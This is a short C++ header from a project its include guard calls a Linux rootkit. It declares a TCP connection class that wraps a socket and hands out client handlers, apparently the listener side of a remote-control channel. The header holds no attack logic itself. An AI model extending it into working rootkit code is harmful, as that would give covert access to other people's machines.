#ifndef ROOTKIT_LINUX_TCP_CONNECTION_ESTABLISHER_H
#define ROOTKIT_LINUX_TCP_CONNECTION_ESTABLISHER_H

#include "../../basic/network/basic_connection_establisher.h"
#include "linux_client_handler.h"

#include <sys/socket.h>
#include <arpa/inet.h>

class linux_tcp_connection_establisher : public basic_connection_establisher {
protected:
    int socket_fd;

public:
    explicit linux_tcp_connection_establisher(int socketFd) : socket_fd(socketFd) {}

    std::unique_ptr<basic_client_handler> next_client() override;
};


#endif //ROOTKIT_LINUX_TCP_CONNECTION_ESTABLISHER_H
